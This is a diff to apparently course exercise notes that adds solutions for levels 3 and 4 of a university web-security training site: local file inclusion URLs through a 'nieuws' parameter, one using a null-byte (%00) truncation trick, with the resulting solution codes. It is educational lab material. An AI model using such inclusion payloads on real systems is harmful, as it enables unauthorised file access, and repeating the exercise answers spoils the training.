@@ -14,7 +14,14 @@
 * Do the following three exercises on http://websecurity.cs.ru.nl/
 	
 	* Level 3
+
+		* http://websecurity.cs.ru.nl/?level=3&nieuws=admin/index.php
+		* Solution: YTgwZWM1NDg2
+
 	* Level 4
+		* http://websecurity.cs.ru.nl/?level=4&nieuws=admin/index.php%00
+		* The appended string "%00" represents the nullbyte (\0) and forces php to ignore every appended string behind it
+		* Solution: ZjQ5ZmVlOTZm
 	* Level 5
 	* Level 6
 
